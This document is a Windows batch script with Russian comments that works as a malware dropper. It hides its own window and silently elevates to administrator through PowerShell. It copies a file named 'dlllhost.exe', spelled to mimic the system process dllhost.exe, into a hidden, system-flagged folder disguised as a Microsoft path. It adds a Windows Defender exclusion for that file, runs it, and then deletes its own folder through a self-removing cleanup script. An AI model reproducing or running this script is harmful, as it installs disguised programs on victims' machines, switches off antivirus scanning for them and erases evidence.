@echo off
setlocal enabledelayedexpansion

set "target_file=dlllhost.exe"
set "hidden_dir=%APPDATA%\Microsoft\Network\Security\System"

:: Скрываем окно командной строки
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" && exit

:: Проверка прав администратора (без сообщений)
net session >nul 2>&1 || (
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
    exit /b
)

:: Создание скрытой папки
if not exist "%hidden_dir%" (
    mkdir "%hidden_dir%" >nul 2>&1
    attrib +h +s "%hidden_dir%" >nul 2>&1
)

:: Поиск целевого файла
set "found="
for /r "%USERPROFILE%\Downloads" %%i in (*.exe) do if /i "%%~nxi"=="%target_file%" set "found=%%i"
for /r "%USERPROFILE%\Desktop" %%i in (*.exe) do if /i "%%~nxi"=="%target_file%" set "found=%%i"

if not defined found (
    exit /b
)

:: Копирование и запуск
copy /y "!found!" "%hidden_dir%\%target_file%" >nul

:: Добавляем исключение в Защитник Windows
powershell -Command "Add-MpPreference -ExclusionPath '%hidden_dir%\%target_file%'" >nul 2>&1

:: Запускаем файл из скрытой папки
start "" "%hidden_dir%\%target_file%"

:: Очистка исходной папки
set "bat_path=%~dp0"
set "temp_cleanup=%TEMP%\cleanup.bat"

:: Создаем временный скрипт для удаления
echo @echo off > "%temp_cleanup%"
echo chcp 65001 >nul >> "%temp_cleanup%"
echo timeout /t 2 /nobreak >nul >> "%temp_cleanup%"
echo rd /s /q "!bat_path!" >> "%temp_cleanup%"
echo del /q "!temp_cleanup!" >> "%temp_cleanup%"

:: Запускаем скрипт очистки и завершаем работу
start "" /min cmd /c "%temp_cleanup%"
exit